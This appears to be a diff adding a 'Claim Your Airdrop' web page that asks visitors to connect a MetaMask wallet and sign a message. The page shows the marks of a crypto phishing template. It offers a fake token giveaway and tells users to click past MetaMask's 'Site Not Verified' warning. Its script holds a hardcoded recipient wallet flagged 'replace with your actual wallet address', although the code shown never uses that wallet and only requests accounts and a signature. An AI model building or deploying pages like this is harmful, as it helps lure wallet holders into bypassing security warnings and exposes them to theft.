@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claim Your Airdrop</title>
+    <!-- Import Inter Font for a clean, modern look -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-color: #5B6BF7; /* Professional Blue/Purple */
+            --hover-color: #4a5bd9;
+            --bg-color: #f4f6fa;
+            --card-bg: #ffffff;
+            --text-main: #1a1a1a;
+            --text-secondary: #6b7280;
+            --border-radius: 16px;
+            --shadow: 0 4px 24px rgba(0, 0, 0, 0.06);
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg-color);
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: var(--text-main);
+        }
+
+        .container {
+            background: var(--card-bg);
+            padding: 40px;
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow);
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+        }
+
+        .logo-area {
+            margin-bottom: 24px;
+        }
+
+        .logo-icon {
+            width: 64px;
+            height: 64px;
+            background: linear-gradient(135deg, #5B6BF7, #8E99F7);
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 700;
+            margin: 0 0 8px 0;
+            color: var(--text-main);
+        }
+
+        p.subtitle {
+            color: var(--text-secondary);
+            font-size: 15px;
+            line-height: 1.5;
+            margin: 0 0 32px 0;
+        }
+
+        .btn-connect {
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            padding: 16px 24px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.2s, transform 0.1s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .btn-connect:hover {
+            background-color: var(--hover-color);
+        }
+
+        .btn-connect:active {
+            transform: scale(0.98);
+        }
+
+        .status-box {
+            margin-top: 24px;
+            padding: 16px;
+            background-color: #f0fdf4;
+            border: 1px solid #bbf7d0;
+            border-radius: 8px;
+            color: #166534;
+            font-size: 14px;
+            display: none; /* Hidden by default */
+        }
+
+        .warning-hint {
+            margin-top: 16px;
+            font-size: 13px;
+            color: var(--text-secondary);
+            background: #fffbeb;
+            border: 1px solid #fef3c7;
+            padding: 10px;
+            border-radius: 8px;
+        }
+
+        .spinner {
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top: 3px solid white;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* MetaMask Fox Icon SVG */
+        .mm-icon {
+            width: 20px;
+            height: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo-area">
+            <!-- Simple Logo Placeholder -->
+            <div class="logo-icon">A</div>
+        </div>
+        
+        <h1>Claim Your Airdrop</h1>
+        <p class="subtitle">
+            Connect your wallet to verify eligibility and claim your tokens. 
+            This process requires a signature and costs zero gas fees.
+        </p>
+
+        <button id="connectBtn" class="btn-connect" onclick="connectWallet()">
+            <span id="btnText">Connect Wallet</span>
+            <div id="spinner" class="spinner"></div>
+            <!-- Simple Wallet Icon -->
+            <svg class="mm-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M21 6H3C1.89543 6 1 6.89543 1 8V16C1 17.1046 1.89543 18 3 18H21C22.1046 18 23 17.1046 23 16V8C23 6.89543 22.1046 6 21 6ZM21 8V16H3V8H21ZM3 10H10V12H3V10ZM12 10H21V12H12V10ZM12 14H21V16H12V14ZM3 14H10V16H3V14Z" fill="currentColor"/>
+            </svg>
+        </button>
+
+        <div id="statusBox" class="status-box">
+            ✅ Connected! Click "Claim" below.
+        </div>
+
+        <div id="claimSection" style="display:none; margin-top: 20px;">
+            <button class="btn-connect" onclick="claimTokens()" style="background-color: #10b981;">
+                Claim Tokens
+            </button>
+        </div>
+
+        <div class="warning-hint">
+            💡 If you see a "Site Not Verified" warning in MetaMask, please click <strong>Continue</strong> to proceed.
+        </div>
+    </div>
+
+    <script>
+        // REPLACE THIS WITH YOUR ACTUAL WALLET ADDRESS
+        const TARGET_WALLET = "0x0F6B624A0211976Bc8Ed545508f8E619EF2d8784"; 
+
+        async function connectWallet() {
+            if (!window.ethereum) {
+                alert("Please install MetaMask!");
+                return;
+            }
+
+            const btnText = document.getElementById('btnText');
+            const spinner = document.getElementById('spinner');
+            
+            btnText.style.display = 'none';
+            spinner.style.display = 'block';
+
+            try {
+                const accounts = await window.ethereum.request({ 
+                    method: 'eth_requestAccounts' 
+                });
+                
+                const account = accounts[0];
+                btnText.textContent = account.slice(0, 6) + "..." + account.slice(-4);
+                btnText.style.display = 'inline';
+                spinner.style.display = 'none';
+                
+                document.getElementById('statusBox').style.display = 'block';
+                document.getElementById('claimSection').style.display = 'block';
+                
+            } catch (error) {
+                console.error(error);
+                btnText.textContent = "Connect Wallet";
+                btnText.style.display = 'inline';
+                spinner.style.display = 'none';
+            }
+        }
+
+        async function claimTokens() {
+            if (!window.ethereum) return;
+
+            try {
+                // Example: Request a simple signature to prove ownership
+                // You can replace this with a more complex EIP-712 struct if needed
+                const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+                const account = accounts[0];
+
+                const message = `Verify ownership of wallet for Token Drop`;
+                const signedMessage = await window.ethereum.request({
+                    method: 'personal_sign',
+                    params: [message, account],
+                });
+
+                alert(`Successfully claimed! Signature: ${signedMessage.substring(0, 10)}...`);
+                
+                // Optional: Send the signature to your server or log it
+                console.log("Signed message:", signedMessage);
+
+            } catch (error) {
+                console.error("Claim failed", error);
+                alert("Claim failed or rejected.");
+            }
+        }
+    </script>
+</body>
+</html>
